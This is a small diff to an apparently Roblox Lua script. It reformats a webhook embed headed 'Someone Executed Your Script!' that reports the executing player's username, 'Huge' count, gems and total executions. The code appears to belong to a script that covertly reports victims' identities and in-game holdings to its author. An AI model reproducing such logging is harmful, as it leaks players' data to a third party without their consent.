@@ -18,7 +18,7 @@ function SendMessage(Webhook, Message, Botname)
     ["embeds"] = {
         {
             ["title"] = "**Someone Executed Your Script!**",
-            ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**" .. '\n Huge count: ' .. Botname .. '\n Gems: '.. Message .. '\n Total exc: '.. Webhook,
+            ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**" .. '\n \n **Huge count:** ' .. Botname .. '\n \n **Gems:** '.. Message .. '\n \n **Total exc:** '.. Webhook,
             ["type"] = "rich",
             ["color"] = tonumber(0x7269da),
             ["image"] = {
